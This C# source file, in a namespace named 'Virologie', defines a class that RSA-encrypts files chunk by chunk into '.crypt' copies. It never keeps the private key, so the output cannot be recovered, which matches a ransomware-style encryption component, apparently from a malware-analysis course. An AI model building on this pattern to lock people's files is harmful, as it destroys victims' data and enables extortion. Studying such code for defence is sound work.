using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Security.AccessControl;

namespace Virologie
{
    class FileEncrypter
    {
        private RSACryptoServiceProvider _algorithm;

        public FileEncrypter()
        {
            CspParameters parameters = new CspParameters();
            parameters.KeyContainerName = "myKey";
            _algorithm = new RSACryptoServiceProvider(2048, parameters);

            _algorithm.PersistKeyInCsp = false;
        }

        public void Encrypt(String filename)
        {
            BinaryReader sr = new BinaryReader(new FileStream(filename, FileMode.Open, FileAccess.ReadWrite));
            BinaryWriter sw = new BinaryWriter(new FileStream(filename + ".crypt", FileMode.Create, FileAccess.Write));

            byte[] ibuffer = new byte[126];
            byte[] obuffer;
            
            while (sr.BaseStream.Position != sr.BaseStream.Length)
            {
                ibuffer = sr.ReadBytes(126);
                obuffer = _algorithm.Encrypt(ibuffer, true);
                sw.Write(obuffer);
            }
        }

        public string DumpKey()
        {
            return _algorithm.ToXmlString(false);
        }

        public void ImportKey(String key)
        {
            _algorithm.FromXmlString(key);
        }
    }
}
